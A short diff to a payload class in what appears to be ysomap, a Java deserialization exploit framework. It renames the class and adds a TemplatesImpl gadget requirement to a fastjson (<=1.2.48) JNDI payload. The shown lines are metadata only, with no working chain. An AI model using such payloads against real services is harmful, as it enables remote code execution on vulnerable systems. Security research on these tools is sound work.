@@ -15,9 +15,9 @@ import ysomap.payloads.AbstractPayload;
 @SuppressWarnings({"rawtypes"})
 @Authors({ Authors.WH1T3P1G })
 @Targets({Targets.JDK, Targets.JNDI})
-@Require(bullets = {"LdapAttributeBullet", "JdbcRowSetImplBullet"}, param = false)
+@Require(bullets = {"LdapAttributeBullet", "JdbcRowSetImplBullet", "TemplatesImplBullet"}, param = false)
 @Dependencies({"fastjson<=1.2.48"})
-public class JsonObjectToJndi extends AbstractPayload<Object> {
+public class JsonObject1 extends AbstractPayload<Object> {
 
     @Override
     public Bullet getDefaultBullet(Object... args) throws Exception {
